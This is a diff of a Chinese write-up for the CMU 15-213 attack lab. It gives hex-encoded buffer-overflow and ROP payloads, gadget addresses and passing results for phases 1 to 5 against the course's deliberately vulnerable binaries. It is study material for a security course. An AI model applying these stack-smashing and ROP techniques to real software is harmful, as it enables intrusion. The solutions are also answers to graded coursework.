@@ -59,7 +59,7 @@ objdump -S ctarget > ctarget.lst
 ```
 栈空间分配了0x28 = 40B空间，这个空间用来存放标准输入的数据。
 
-# touch1
+# phase1
 
 ``` asm
 00000000004017c0 <touch1>:
@@ -96,7 +96,7 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
 ```
-# touch2
+# phase2
 
 ## 分析任务要求
 
@@ -176,8 +176,8 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
 ```
-# touch3
-touch3()函数会调用hexmatch(cokkie. sval)函数，在hexmatch中会分配一个110B的cbuf数组，将cookie的值按格式化字符串"59b997fa"输出到这个数字的一个随机位置，然后比较sval和格式化字符串的前9个字节。
+# phase3
+touch3()函数会调用hexmatch(cookie. sval)函数，在hexmatch中会分配一个110B的cbuf数组，将cookie的值按格式化字符串"59b997fa"输出到这个数字的一个随机位置，然后比较sval和格式化字符串的前9个字节。
 
 关键问题：
 - cookie格式化字符串对应的ascii码是啥？
@@ -186,7 +186,7 @@ touch3()函数会调用hexmatch(cokkie. sval)函数，在hexmatch中会分配一
 - getbuf后跳转到touch3位置00000000004018fa
 - touch3输入参数是字符串所在位置，那么这个字符串放在哪里？怎么将字符串指针传入touch3？
   - getbuf后会跳转到touch3函数，此时touch3栈自动销毁，touch3会建立新的函数栈，因此这个字符串应该放在test栈中，比如test函数栈顶
-  - 怎么将cookie对应的ascii码写到test栈顶呢？显然和前面的方式一样，getbuf分配的是40B,只需要在40B之后写ascii码就能覆盖test栈帧
+  - 怎么将cookie对应的ascii码写到test栈顶呢？显然和前面的方式一样，getbuf分配的是40B,只需要在40B之后写ascii码就能覆盖到test栈帧
 - 注入代码位置？
   - 和touch2一样，放在getbuf的栈中
 
@@ -336,63 +336,153 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
 ```
+
+---
+phase4和phase5用到的攻击方法为ROP，
+- [ROP介绍](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/)
+- [Pwn基础](https://hello-ctf.com/hc-pwn/Stack_Overflow/#_4)
+
+在代码注入的攻击测试中，函数栈位置是固定不变的，如果栈位置每次都是随机产生的那么原来的攻击方式将不适用，因此采用ROP方式。
+该攻击方式的特点是：
+- 利用现有代码的片段拼凑出自己想要的逻辑
+- 和栈初始化位置无关，如果需要用到栈内地址，可以采用相对偏移来获取
+
+首先，反汇编rtarget
+```
+objdump -d rtarget > rtarget.txt
+```
 # phase4
-重复phase2的攻击过程，但要是使用gadgets
+重复phase2的攻击过程，但是使用gadgets
 
 > Gadgets是指一些小的、独立的机器指令段。攻击者可以组合这些指令来构建一个更复杂的攻击。例如，这些gadgets通常由一些基本的x86-64指令（如movq、popq、ret等）组成。
 
+## ROP分析过程
+在phase2中用到的注入代码为：
 ```
 movq $0x59b997fa, %rdi
 pushq $0x4017ec
 ret
 ```
-0x4017ec
-0x59b997fa
-pop %rdi; ret( pop -> pc and jmp)
+上述代码可以通过在覆盖test栈区域为
+|test stack|
+|----|
+|0x4017ec(touch2地址)|
+|0x59b997fa(cookie value)|
+|func(){pop %rdi; ret}| <==返回地址
 
-在start farm到end farm 中使用相应的gadget
+```
+func:
+  pop %rdi
+  ret
+```
 
+执行逻辑：
+正常来说：getbuf调用执行到ret时，从栈中弹出返回地址，PC指向这个地址开始执行新的指令
+在代码注入后：
+  1. 执行ret时，栈弹出func地址，PC跳转到func地址处；
+  2. 当func函数执行`pop %rdi`后cookie value从栈中弹出，并且`%rdi = 0x59b997fa`；
+  3. func执行`ret`时touch2地址弹出，PC跳转到touch2函数执行。
 
-step4. movq %rax, %rdi -- 48 89 c7
-step3. ret -- c3
+但是！writeup要求使用rtarget中从start farm到end farm 的gadget。通过writeup figure3找到func对应的指令编码`5f c3`,不过在提供的gadgets中没有找到合适的，所以需要绕一下。
 
+|test stack|对应的机器码|
+|----|----|
+|touch2 地址||
+|movq %rax, %rdi;ret;| 48 89 c7 c3|
+|cookie value|59b997fa|
+|popq %rax; ret;|58 c3|
+
+注意这些机器码不能直接被注入，否则和原来的方法是一样的，我们要使用rtarget中现有的gadgets,找到以下gadgets：
+
+> 90机器码表示nop
 ```
 00000000004019c3 <setval_426>:
-  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c3:	c7 07 **48 89 c7 90**    	movl   $0x90c78948,(%rdi)
   4019c9:	c3                   	retq     
-```
-**4019C5**
+==> gadget1 addr = 0x4019c3 + 2 = 0x4019c5
 
-cookie value = 0x59b997fa
-
-step2. popq, %rax -- rax = cookie, 58
-step1. ret --> jmpto gadget1
-
-```
 00000000004019a7 <addval_219>:
-  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019a7:	8d 87 51 73 **58 90**    	lea    -0x6fa78caf(%rdi),%eax
   4019ad:	c3                   	retq 
-```
-
-**0x4019AB**
+==> gadget2 addr = 0x4019a7 + 4 = 0x4019ab
 
 ```
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-ab 19 40 00 00 00 00 00 
-fa 97 b9 59 00 00 00 00 
-c5 19 40 00 00 00 00 00 
-```
+## 注入代码
 
+```
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 ==> 填充getbuf 40B栈空间
+ab 19 40 00 00 00 00 00 ==> popq %rax; ret;
+fa 97 b9 59 00 00 00 00 ==> cookie
+c5 19 40 00 00 00 00 00 ==> movq %rax, %rdi;ret;
+ec 17 40 00 00 00 00 00 ==> touch2地址
+```
+## 测试结果
+```
+unix> ./hex2raw < phase4.txt > p4raw.txt
+unix> ./rtarget -q -i p4raw.txt
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
 # phase5
-invoke touch3 with 指向字符串cookie的指针
+重复touch3攻击，但是现在栈随机化导致cookie所在位置是不确定，所以需要通过rsp + offset获取cookie位置，然后赋值到%rdi作为touch3函数的输入参数
 
-cookie放在一个固定位置?no, 需要通过rsp+offset获取位置
+## step1
+首先将rsp值存到一个寄存器，所以要寻找的gadget为
+```
+movq %rsp, %xxx; 48 89 ex， x不确定
+ret; 
+```
+通过查看只有一个寄存器符合要求：rax
 
-**0x401AAD**
+所以确定第一个gadget
+```
+movq %rsp, %rax;ret; -- 48 89 e0；c3;
+```
+```
+0000000000401aab <setval_350>:
+  401aab:	c7 07 **48 89 e0** 90    	movl   $0x90e08948,(%rdi)
+  401ab1:	c3                   	ret    
+```
+我们要用的gadget addr = 0x401aab + 2 = 0x401aad
+
+现在有一个基础的注入代码段：
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 // getbuf 40B
+
+ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
+xx xx xx xx xx xx xx xx // pop %xxx;retq 
+xx xx xx xx xx xx xx xx // offset
+xx xx xx xx xx xx xx xx // %rdi = %rsp + %xxx
+fa 18 40 00 00 00 00 00 // touch3 addr
+35 39 62 39 39 37 66 61 // cookie ascii码
+```
+## step2
+ %rdi = %rsp + %xxx ==> leaq指令可以实现
+
+> leaq a(b, c, d), %rax 先计算地址a + b + c * d，然后把最终地址载到寄存器rax中。
+
+唯一可用的gadget如下：
+```
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+```
+
+代码代码段更新为：
 
 ```
 00 00 00 00 00 00 00 00
@@ -402,29 +492,43 @@ cookie放在一个固定位置?no, 需要通过rsp+offset获取位置
 00 00 00 00 00 00 00 00 // getbuf 40B
 
 ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
-00 00 00 00 00 00 00 00 // pop %xxx;retq
-00 00 00 00 00 00 00 00 // offset = %xxx
-00 00 00 00 00 00 00 00 // %rdi = %rsp + %xxx ==> leaq指令可以实现
+xx xx xx xx xx xx xx xx // movq %rax, %rdi or %rsi
+xx xx xx xx xx xx xx xx // pop %xxx;retq
+xx xx xx xx xx xx xx xx // offset
+d6 19 40 00 00 00 00 00 // %rax = %rdi + %rsi; ret;
+xx xx xx xx xx xx xx xx // movq %rax, %rdi; ret;
 fa 18 40 00 00 00 00 00 // touch3 addr
-35 39 62 39 39 37 66 61 // cookie ascii
+35 39 62 39 39 37 66 61 // cookie ascii码
+```
+## step3
+- 在phase4可知，只有`pop %rax`
+- 查找rtarget发现有`movq %rax, %rdi`
+  
+```
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 **48 89 c7** 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+```
+gadget addr = 0x4019c5
+
+更新注入代码：
+  
+```
+00 00 00 00 00 00 00 00 // getbuf 40B
+
+ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
+c5 19 40 00 00 00 00 00 // movq %rax, %rdi ==> %rdi=%rsp
+ab 19 40 00 00 00 00 00 // pop %rax;retq ==> %rax=offset
+xx xx xx xx xx xx xx xx // offset
+xx xx xx xx xx xx xx xx // move %rax, %rsi;ret;
+d6 19 40 00 00 00 00 00 // %rax = %rdi + %rsi; ret;
+c5 19 40 00 00 00 00 00 // movq %rax, %rdi; ret;
+fa 18 40 00 00 00 00 00 // touch3 addr
+35 39 62 39 39 37 66 61 // cookie ascii码
 ```
 
-leaq a(b, c, d), %rax 先计算地址a + b + c * d，然后把最终地址载到寄存器rax中。
-
-```
-00000000004019d6 <add_xy>:
-  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
-  4019da:	c3                   	retq   
-```
-
-%rax = %rdi + %rsi * 1
-
-在phase4可知，只有pop %rax
-```
-00000000004019a7 <addval_219>:
-  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
-  4019ad:	c3                   	retq 
-```
+## step4
+- 尝试查找`move %rax, %rsi`,发现没有，尝试寻找别的
 
 ```
 ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
@@ -446,48 +550,7 @@ fa 18 40 00 00 00 00 00 // touch3 addr
 
 offset = 8*9 = 72 = 0x48
 
-```
-00000000004019a7 <addval_219>:
-  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
-  4019ad:	c3                   	retq   
-```
-0x4019ab
-
-```
-00000000004019c3 <setval_426>:
-  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
-  4019c9:	c3                   	retq   
-```
-0x4019c5
-
-```
-00000000004019c3 <setval_426>:
-  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
-  4019c9:	c3   
-```
-0x4019c5
-
-```
-00000000004019db <getval_481>:
-  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
-  4019e0:	c3                   	retq  
-```
-0x4019dd
-
-0000000000401a11 <addval_436>:
-  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
-  401a17:	c3                   	retq   
-
-  0x401a13
-
-0000000000401a6e <setval_167>:
-  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
-  401a74:	c3                   	retq   
- 0x401a70
-
-完整的输入
-```
-```
+## 测试结果
 
 ```
 unix> ./rtarget -q -i t5raw.txt 
